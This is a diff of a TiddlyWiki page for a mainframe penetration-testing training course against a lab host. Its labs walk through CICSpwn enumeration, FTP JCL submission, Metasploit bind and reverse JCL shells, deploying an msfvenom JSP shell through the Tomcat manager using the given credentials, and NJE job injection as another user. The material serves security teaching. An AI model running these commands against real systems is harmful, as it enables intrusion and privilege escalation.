@@ -161,13 +161,17 @@ Error message and password prompt
 
 <li>Lab 2 - Headless Interaction</li>
 
-<li>Lab 3 - FTP Code Execution</li>
+<li>Lab 3 - CICSpwn and CICS fun</li>
 
-<li>Lab 4 - Metasploit</li>
+<li>Lab 4 - FTP Code Execution</li>
 
 <li>Lab 5 - Hacking Tomcat</li>
 
+<li>Lab 5 - Metasploit &amp; Tomcat</li>
+
 <li>Lab 6 - z/OS Enumeration</li>
+
+<li>Lab 7 - NJE Privesc</li>
 
 </ul>
 </p>
@@ -8716,13 +8720,14 @@ Error message and password prompt
     }
 }</pre>
 </div>
-<div created="20181014055452118" modified="20181113215819390" title="$:/DefaultTiddlers">
-<pre>[[Lab 1 - Enumeration]]
-[[Lab 2 - Headless Interaction]]
-[[Lab 3 - FTP Code Execution]]
-[[Lab 4 - Metasploit]]
-[[Lab 5 - Hacking Tomcat]]
-[[Lab 6 - z/OS Enumeration]]
+<div created="20181014055452118" modified="20190515040442657" title="$:/DefaultTiddlers">
+<pre> [[Lab 1 - Enumeration]]
+ [[Lab 2 - Headless Interaction]]
+ [[Lab 3 - CICSpwn and CICS fun]]
+ [[Lab 4 - FTP Code Execution]]
+ [[Lab 5 - Metasploit &amp; Tomcat]]
+ [[Lab 6 - z/OS Enumeration]]
+ [[Lab 7 - NJE Privesc]]
 </pre>
 </div>
 <div title="$:/isEncrypted">
@@ -8737,7 +8742,7 @@ Error message and password prompt
 <div created="20181014055436789" modified="20181113215803257" title="$:/state/tab/sidebar--1835078512">
 <pre>$:/core/ui/SideBar/Open</pre>
 </div>
-<div list="[[Lab 1 - Enumeration]] [[Lab 2 - Headless Interaction]] [[Lab 3 - FTP Code Execution]] [[Lab 4 - Metasploit]] [[Lab 5 - Hacking Tomcat]] [[Lab 6 - z/OS Enumeration]]" title="$:/StoryList">
+<div created="20190515031012623" list="$:/ControlPanel [[Lab 1 - Enumeration]] [[Lab 2 - Headless Interaction]] [[Lab 3 - CICSpwn and CICS fun]] [[Lab 4 - FTP Code Execution]] [[Lab 5 - Metasploit &amp; Tomcat]] [[Lab 6 - z/OS Enumeration]] [[Lab 7 - NJE Privesc]]" modified="20190515040411382" title="$:/StoryList">
 <pre></pre>
 </div>
 <div plugin-type="info" title="$:/temp/info-plugin" type="application/json">
@@ -8906,7 +8911,7 @@ Error message and password prompt
     }
 }</pre>
 </div>
-<div created="20181014031150411" modified="20190515023523403" tags="" title="Lab 1 - Enumeration">
+<div created="20181014031150411" modified="20190515031008505" tags="" title="Lab 1 - Enumeration">
 <pre>!!''Lab Objectives''
 # Learning how to obtain Logical Unit (LU)
 # Using s3270 to enumerate LUs
@@ -9107,7 +9112,23 @@ String(&quot;$3\n&quot;)
 EOF
 ```</pre>
 </div>
-<div created="20181014040322322" modified="20190515024009923" tags="" title="Lab 3 - FTP Code Execution">
+<div created="20190515024441464" modified="20190515030953295" tags="" title="Lab 3 - CICSpwn and CICS fun">
+<pre>!!''Lab Objectives''
+# Learning how to use CICSpwn
+# Using CICSpwn to list interesting transaction ID
+# Using Nmap to list CICS information
+
+!!''CICSpwn''
+* Go to `/root/Labs/Day_2/Lab_03` in Kali
+* ''NOTE'' CICWpwn requires a password, to prevent your neighbor seeing your password do: `echo &quot;your password&quot; &gt; pass.txt`
+* run CICSpwn to list CICS information `python2 ./cicspwn.py -A -U evil0 -P $(cat pass.txt) evilmf.evilmainframe.com 992`
+
+!!''Using Nmap to gather CICS info''
+* Nmap can also gather this information
+* Using `cics-info` script: `/usr/local/bin/nmap --script +cics-info -p 992 evilmf.evilmainframe.com --script-args cics-info.user=&lt;&lt;USERID&gt;&gt;,cics-info.pass=&lt;&lt;password&gt;&gt; -dd -vv`
+</pre>
+</div>
+<div created="20181014040322322" modified="20190515031238301" tags="" title="Lab 4 - FTP Code Execution">
 <pre>!!''Lab Objectives''
 # Edit JCL in linux
 # Use FTP to upload and run JCL
@@ -9141,7 +9162,7 @@ SRCHFOR  'IKJEFT'
 !!''FTP Job Submission''
 Use FTP to execute JCL
 
-* Connect to ''evilmf'' with FTP in linux VM
+* Connect to ''evilmf.evilmainframe.com'' with FTP in linux VM
 * Log on with username and password
 * Issue the FTP command `SITE FILE=JES`
 ** If the command fails try lowercase `site`
@@ -9161,7 +9182,7 @@ The following steps will execute some REXX code using JCL, REXX and FTP.
 ** if it fails you can read the help with `-h` and set it to connect with a reverse CATSO
 
 ```
-./TShOcker.py -p 992 -l --lport &lt;choose a port&gt; --print evilmf USERNAME PASSWORD &gt; ./JCL_REXX
+./TShOcker.py -p 992 -l --lport &lt;choose a port between 20000-40000&gt; --print evilmf.evilmainframe.com USERNAME PASSWORD &gt; ./JCL_REXX
 ```
 
 * `--print` means 'Print the JCL' (instead of connecting directly with the script)
@@ -9194,35 +9215,7 @@ Use the `--help` flag and read the documentation to accomplish
 
 </pre>
 </div>
-<div created="20181014044107306" modified="20181105181951626" tags="" title="Lab 4 - Metasploit">
-<pre>!!''Lab Objectives''
-# Use metasploit natively to obtain a reverse USS shell
-
-!!''Using Metasploit to Connect/Execute''
-* The  metasploit exploit `ftp_jcl_creds` uses the command `SITE FILE=JES` to run HLASM
-* The payload `reverse_shell_jcl` is a reverse Unix shell written in JCL and HLASM
-* ''RHOST'' is the target FTP server
-* ''LHOST'' tells metaspoit which IP address to connect back to
-* ''LPORT'' tells metasploit which port to connect back on
-
-''Metasploit''
-
-* Launch metasploit: `msfconsole`
-* At `msf &gt;` prompt type: `use exploit/mainframe/ftp/ftp_jcl_creds`
-* Set the payload with `set payload cmd/mainframe/reverse_shell_jcl`
-* Change the FTP User and password: `set FTPUSER &lt;user&gt;` . and `set FTPPASS &lt;password&gt;`
-* Set ''RHOST'' to evilmf: `set rhost evilmf`
-* Set ''LHOST'' to your IP address: `set lhost &lt;vm ip address&gt;`
-* Set ''LPORT'' to 4321: `set lport 4321`
-* Type `exploit` to launch the exploit and get a reverse shell
-
----
-
-''Bonus'': What does the payload `apf_privesc_jcl` do and how can you use it?
-
-''Note:''  You will not be 'able' to execute this `apf_privesc_jcl`, this is an analysis question only.</pre>
-</div>
-<div created="20181014050649961" modified="20181105182129555" tags="" title="Lab 5 - Hacking Tomcat">
+<div created="20181014050649961" modified="20190515034159680" tags="" title="Lab 5 - Hacking Tomcat">
 <pre>!!''Lab Objectives''
 # Using Nmap to find web servers
 # Using Metasploit to obtain a reverse shell using Tomcat
@@ -9231,7 +9224,7 @@ Use the `--help` flag and read the documentation to accomplish
 !!''Find the Tomcat Server''
 Use nmap, with default options and -sV to find the Tomcat server running:
 
-`nmap -sV evilmf`
+`nmap -sV evilmf.evilmainframe.com -p 8080`
 
 !!''Connect''
 * Open firefox and connect to the port identified in the previous step
@@ -9242,17 +9235,21 @@ Use nmap, with default options and -sV to find the Tomcat server running:
 !!!''WARNING!'' Please do not brute force this account as it will automatically lock everyone out - use the credentials above!
 
 !!''Get a Reverse Shell''
-* Use metasploit to generate a reverse JSP shell
-* Replace `&lt;Your IP Address&gt;`, `&lt;Your Port to Connect On&gt;` and  `&lt;userid&gt;` with appropriate values
+* Use metasploit to generate a bind JSP shell
+* Replace `&lt;port between 20000-30000&gt;` and  `&lt;userid&gt;` with appropriate values
 ```
-msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f war &gt; shell_&lt;userid&gt;.war
+msfvenom -p java/jsp_shell_bind_tcp LPORT=&lt;port between 20000-30000&gt; -f war &gt; shell_&lt;userid&gt;.war
 ```
-* Setup a netcat listener: `nc -nlvp &lt;LPORT&gt;`
+* With firefox browse to `http://evilmf.evilmainframe.com:8080/manager/html`
+** ''Username:'' `tomcat`
+** ''Password:'' `gibson`
 * In the section ''WAR file to deploy'' click `Browse...`
 ** select the war file you created `shell_&lt;userid&gt;.war`
 * click `Deploy`
 * In the ''Applications'' section in the `Path` column find your deployed page `/shell_&lt;userid&gt;` and click that link
-* Once the page loads go back to you netcat listener and enjoy the shell
+* It might take a bit for the page to load
+* While its loading try connecting with ncat: `ncat evilmf.evilmainframe.com &lt;your port&gt;`
+** It may take a few tries
 
 ''Questions''
 
@@ -9260,10 +9257,84 @@ msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Y
 * Which user are you running commands as?
 * What ''attributes'' does this account have?</pre>
 </div>
-<div created="20181014052417597" modified="20181105182729982" tags="" title="Lab 6 - z/OS Enumeration">
+<div created="20181014044107306" modified="20190515034231497" tags="" title="Lab 5 - Metasploit &amp; Tomcat">
+<pre>!!''Lab Objectives''
+# Use metasploit natively to obtain a reverse USS shell
+
+
+!!''Rapid7!!!''
+* So we need to wait for Rapid7 to push this update, so you need to custom patch metasploit for this lab
+* cd to `/root/Labs/msf_patch`
+* run `./msf_ftp_patch.sh`
+* You should see `patching file lib/msf/core/exploit/ftp.rb`
+* Continue with the lab
+
+!!''Using Metasploit to Connect/Execute''
+* The  metasploit exploit `ftp_jcl_creds` uses the command `SITE FILE=JES` to run HLASM
+* The payload `bind_shell_jcl` is a reverse Unix shell written in JCL and HLASM
+* ''RHOSTS'' is the target FTP server
+* ''LPORT'' tells metasploit which port to connect back to
+
+''Metasploit''
+
+* Launch metasploit: `msfconsole`
+* At `msf &gt;` prompt type: `use exploit/mainframe/ftp/ftp_jcl_creds`
+* Set the payload with `set payload cmd/mainframe/bind_shell_jcl`
+* Change the FTP User and password: `set FTPUSER &lt;user&gt;` . and `set FTPPASS &lt;password&gt;`
+* Set ''RHOST'' to evilmf: `set rhost evilmf.evilmainframe.com`
+* Set ''LPORT'' to a port between 20000 and 40000: `set lport &lt;port&gt;` e.g `set lport 22222`
+* Type `exploit` to launch the exploit and get a reverse shell
+
+---
+
+!''Hacking Tomcat''
+
+
+!!''Lab Objectives''
+# Using Nmap to find web servers
+# Using Metasploit to obtain a reverse shell using Tomcat
+# Using Unix commands to run TSO commands
+
+!!''Find the Tomcat Server''
+Use nmap, with default options and -sV to find the Tomcat server running:
+
+`nmap -sV evilmf.evilmainframe.com -p 8080`
+
+!!''Connect''
+* Open firefox and connect to the port identified in the previous step
+* `nikto` can easily find the credentials but to save you time:
+** ''Username:'' `tomcat`
+** ''Password:'' `gibson`
+
+!!!''WARNING!'' Please do not brute force this account as it will automatically lock everyone out - use the credentials above!
+
+!!''Get a Reverse Shell''
+* Use metasploit to generate a bind JSP shell
+* Replace `&lt;port between 20000-30000&gt;` and  `&lt;userid&gt;` with appropriate values
+```
+msfvenom -p java/jsp_shell_bind_tcp LPORT=&lt;port between 20000-30000&gt; -f war &gt; shell_&lt;userid&gt;.war
+```
+* With firefox browse to `http://evilmf.evilmainframe.com:8080/manager/html`
+** ''Username:'' `tomcat`
+** ''Password:'' `gibson`
+* In the section ''WAR file to deploy'' click `Browse...`
+** select the war file you created `shell_&lt;userid&gt;.war`
+* click `Deploy`
+* In the ''Applications'' section in the `Path` column find your deployed page `/shell_&lt;userid&gt;` and click that link
+* It might take a bit for the page to load
+* While its loading try connecting with ncat: `ncat evilmf.evilmainframe.com &lt;your port&gt;`
+** It may take a few tries
+
+''Questions''
+
+* Can you run TSO commands?
+* Which user are you running commands as?
+* What ''attributes'' does this account have?</pre>
+</div>
+<div created="20181014052417597" modified="20190515040403170" tags="" title="Lab 6 - z/OS Enumeration">
 <pre>!!''Lab Objectives''
 # Use multiple methods to identify APF authorized libraries
-# Use REXX script to identify RACF configueation items
+# Use REXX script to identify RACF configuration items
 # Use RACF `SEARCH` to identify what datasets you might have access to
 # Use REXX to identify current dataset concatenation
 
@@ -9293,6 +9364,32 @@ There are multiple ways to list the APF Authorized Libraries:
 * Upload the script `SYS0WN` in the `Labs/Tools/Enumeration` folder to a dataset
 * Execute the script `EX '&lt;userid&gt;.REXXLIB(SYS0WN)'`
 * Do you have better than read to any of these?</pre>
+</div>
+<div created="20190515034456720" modified="20190515040336034" tags="" title="Lab 7 - NJE Privesc">
+<pre>!!''Lab Objectives''
+# Use njelib to connect and submit a job
+# Identify OHOST and RHOST
+
+We've setup an insecure NJE connection on port 175
+The ohost is CLASS
+The rhost is EVIL
+
+!!''Display Jes2 Information''
+* go to `Labs/Tools/NJElib`
+* Install bitstring: `pip install bitstring`
+* run iNJEctor replacing `&lt;rhost&gt;` and `&lt;ohost&gt;` with the values above: `./iNJEctor.py &lt;ohost&gt; &lt;rhost&gt; evilmf.evilmainframe.com \$djes2`
+* Enable debugging if you want to see the NJE protocol in detail by adding `-d` before the ohost
+* ''NOTE'' if it fails keep trying, only one person can connect at a time
+* More command here: https://www.ibm.com/support/knowledgecenter/en/SSLTBW_2.3.0/com.ibm.zos.v2r3.hasa200/has2cmdr.htm
+** ''WARNING'' only use $D commands
+
+!!''Submit a job''
+* Edit the JCL `nop.jcl` in the folder `Labs/Tools/NJElib/JCL`
+* Replace `NEWYORK` with `EVIL`
+* Replace `NOTIFY=&amp;SYSUID` with `NOTIFY=&lt;your userid&gt;,USER=EVIL55`
+* run `jcl.py`: `./jcl.py CLASS EVIL evilmf.evilmainframe.com JCL/nop.jcl EVIL55`
+
+</pre>
 </div>
 
 </div>
